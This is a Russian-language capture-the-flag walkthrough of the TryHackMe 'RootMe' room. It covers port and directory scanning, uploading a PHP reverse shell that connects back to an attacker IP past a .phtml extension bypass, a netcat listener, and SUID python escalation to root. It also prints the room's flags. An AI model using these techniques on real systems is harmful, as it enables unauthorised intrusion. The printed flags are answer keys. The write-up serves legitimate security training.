[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [RootMe](https://tryhackme.com/r/room/rrootme) 

Всего 4 задания:
## Задание 1
Подключитесь к сети TryHackMe и разверните машину. Если вы не знаете, как это сделать, сначала пройдите комнату OpenVPN.
```commandline
penvpn /home/kali/Documents/THM-openvpn/andrej.marinchenko.ovpn
ip addr
```
- 10.9.1.51 - адрес моей машины с kali linux для атаки
- 10.10.108.56 - адрес целевой машины

### Ответить на вопросы ниже
Разверните машину
```commandline
Ответ не нужен
```

## Задание 2
Для начала давайте получим информацию о цели.
```commandline
nmap -sC -sV 10.10.108.56

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-10 04:39 EDT
Nmap scan report for 10.10.108.56
Host is up (0.073s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 4a:b9:16:08:84:c2:54:48:ba:5c:fd:3f:22:5f:22:14 (RSA)
|   256 a9:a6:86:e8:ec:96:c3:f0:03:cd:16:d5:49:73:d0:82 (ECDSA)
|_  256 22:f6:b5:a6:54:d9:78:7c:26:03:5a:95:f3:f9:df:cd (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.14 seconds
```
### Ответить на вопросы ниже
Просканируйте машину, сколько портов открыто?
```commandline
2
```
Какая версия Apache используется?
```commandline
2.4.29
```
Какая служба работает на порту 22?

```commandline
ssh
```
Найдите каталоги на веб-сервере с помощью инструмента GoBuster.
```commandline
gobuster dir -u 10.10.108.56 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.108.56
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/uploads              (Status: 301) [Size: 314] [--> http://10.10.108.56/uploads/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.108.56/css/]
/js                   (Status: 301) [Size: 309] [--> http://10.10.108.56/js/]
/panel                (Status: 301) [Size: 312] [--> http://10.10.108.56/panel/]
Progress: 6091 / 220561 (2.76%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 6110 / 220561 (2.77%)
===============================================================
Finished
===============================================================
```
```commandline
Ответ не нужен
```
Что такое скрытый каталог?
```commandline
/panel/
```

## Задание 3
Найдите форму для загрузки и получения обратного шелла, а также найдите флаг.

на найденной странице http://10.10.108.56/panel/ мы можем загружать файлы, давайте попробуем загрузить наш 
реверс-шелл написанный на php, для этого создадим файл:
```commandline
nano reverse.php
```
и вставим в него содержимое реверс-шела на подобии такого https://github.com/pentestmonkey/php-reverse-shell только 
не забываем заменить значения IP-адреса и порта для прослушивания, которые мы запустим для подключения в моем случае 
это 
- $ip = '10.9.1.51';  // CHANGE THIS
- $port = 4444;       // CHANGE THIS

отлично, файл мы создали, теперь его нужно загрузить на целевую машину, для этого перейдем на страницу 
http://10.10.108.56/panel/ выберем загрузить файл в соответсвующем поле и выберем на php файл, сразу мы получим 
предупреждение, php-файлы загружать нельзя, не беда, обойдем эту проверку переименовав наш файл из php в phtml
```commandline
mv reverse.php reverse.phtml
```
и повторим попытку загрузки файла на странице http://10.10.108.56/panel/ на этот раз все получилось...
далее откроем на нашей машине порт для прослушивания и подключения с машины жертвы:
```commandline
nc -lvnp 4444
```
теперь нам осталось выполнить наш реверс-шел, запустить его на машине жертвы можно перейдя на другую страницу
http://10.10.108.56/uploads/
и выбрать название нашего реверс-шела, для его выполнения. После чего возвращаемся на нашу машину где прослушивался 
соответсвующий порт и убедится в том, что доступ к машине жертвы получен.

```commandline
id 
whoami
```
конечно мы не обладаем правами супер-пользователя, но даже этого будет достаточно что бы найти 1-й флаг
```commandline
find / -type f -name user.txt 2>/dev/null 
cat /var/www/user.txt
```

### Ответить на вопросы ниже
пользователь.txt

```commandline
THM{y0u_g0t_a_sh3ll}
```

## Задание 4
Теперь, когда у нас есть оболочка, давайте повысим наши привилегии до root.
Для этого найдем файлы которые можно выполнить с правами суперпользователя
```commandline
find / -type f -user root -perm -4000 2>/dev/null
or
find / -perm -u=s -type f 2>/dev/null
```
т.к. есть возможность запускать python, этим мы и воспользуемся, для того что бы подобрать команду можно 
перейти на https://gtfobins.github.io/ и в соответсвующем разделе python - SUID найти нужную строку:
```commandline
python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’
id
whoami
find / -type f -name root.txt 2>/dev/null
cat /root/root.txt
```
### Ответить на вопросы ниже
Найдите файлы с разрешением SUID. Какой файл странный?

```commandline
/usr/bin/python
```
Найдите форму для повышения своих привилегий.
```commandline
Ответ не нужен
```
корень.txt
```commandline
THM{pr1v1l3g3_3sc4l4t10n}
```

## Задание 5

```commandline
Ответ не нужен
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

